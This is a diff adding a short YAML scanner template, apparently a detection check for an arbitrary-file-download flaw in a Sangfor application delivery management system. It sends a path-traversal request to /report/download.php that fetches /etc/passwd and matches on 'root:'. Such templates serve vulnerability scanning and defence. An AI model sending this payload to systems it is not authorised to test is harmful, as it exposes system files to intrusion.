@@ -1,0 +1,11 @@
+name: 深信服-应用交付管理系统
+description: >-
+  任意文件下载
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /report/download.php?pdf=../../../../../etc/passwd
+    expression:
+      status: 200
+      body_all: ["root:"]
